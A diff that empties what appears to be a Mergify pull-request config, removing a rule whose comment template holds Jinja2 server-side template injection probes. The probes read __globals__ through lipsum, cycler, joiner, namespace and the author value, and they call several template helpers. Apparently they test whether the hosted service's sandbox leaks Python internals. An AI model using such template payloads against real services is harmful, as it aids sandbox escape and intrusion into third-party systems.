@@ -1,18 +1,1 @@
-pull_request_rules:
-  - name: ssti-v10-safe
-    conditions: []
-    actions:
-      comment:
-        message: |
-          === G4o7T v10 (default catches Undefined) ===
-          author={{ author }}
-          {% if author %}
-          D1-author-globals: {{ (author | attr('__globals__')) | default('UNDEF') }}
-          D2-lipsum-globals: {{ (lipsum | attr('__globals__')) | default('UNDEF') }}
-          D3-cycler-globals: {{ (cycler | attr('__globals__')) | default('UNDEF') }}
-          D4-joiner-globals: {{ (joiner | attr('__globals__')) | default('UNDEF') }}
-          D5-namespace-globals: {{ (namespace | attr('__globals__')) | default('UNDEF') }}
-          D6-lipsum-call: {{ (lipsum()) | default('UNDEF') }}
-          D7-joiner-call: {{ (joiner()) | default('UNDEF') }}
-          D8-cycler-call: {{ (cycler('a','b')) | default('UNDEF') }}
-          {% endif %}
+pull_request_rules: []
